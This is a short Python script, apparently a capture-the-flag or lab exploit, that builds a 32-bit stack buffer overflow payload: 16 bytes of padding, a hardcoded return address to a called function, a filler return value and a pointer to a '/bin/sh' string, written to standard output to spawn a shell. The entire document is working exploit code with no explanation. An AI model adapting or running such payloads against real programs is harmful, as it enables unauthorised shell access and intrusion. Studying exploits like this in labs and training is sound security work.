import struct, sys
 
ADDR_NOW_CALLED = 0x08049196
ADDR_BINSH      = 0x0804a008
 
payload = b"A"*16 + struct.pack("<I", ADDR_NOW_CALLED) + b"BBBB" + struct.pack("<I", ADDR_BINSH)
sys.stdout.buffer.write(payload)